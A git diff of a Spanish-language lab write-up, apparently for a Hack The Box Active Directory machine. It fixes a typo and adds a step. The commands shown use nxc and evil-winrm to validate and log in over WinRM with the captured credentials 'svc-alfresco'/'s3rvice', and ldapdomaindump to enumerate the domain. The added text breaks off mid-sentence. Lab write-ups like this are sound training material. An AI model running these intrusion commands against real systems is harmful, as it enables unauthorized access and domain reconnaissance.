@@ -129,7 +129,7 @@ NETLOGON        READ            Logon server share
 SYSVOL          READ            Logon server share 
 ```
 
-Probaremos tambien si son credenciales validas para servicio de `WINRM`
+Probaremos también si son credenciales validas para servicio de `WINRM`
 ```shell
 nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 ```
@@ -139,3 +139,10 @@ Accederemos entonces al servicio usando [[EVIL-WINRM]]
 evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 ```
 
+
+Usaremos en nuestra maquina atacante la herramienta [[LDAPDOMAINDUMP]] para  obtener toda la información del dominio usando unas credenciales validas
+```shell
+ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.95.210
+```
+
+Obteniendo toda la informacion del dominio, si ahora no
